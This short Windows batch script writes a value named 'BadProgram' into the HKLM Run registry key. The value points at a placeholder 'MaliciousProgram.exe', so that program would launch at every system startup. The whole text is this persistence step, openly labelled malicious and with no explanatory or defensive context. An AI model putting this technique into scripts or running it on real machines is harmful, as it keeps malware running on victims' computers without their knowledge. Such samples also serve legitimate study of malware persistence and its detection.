@echo off
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BadProgram /t REG_SZ /d "C:\Path\To\MaliciousProgram.exe"
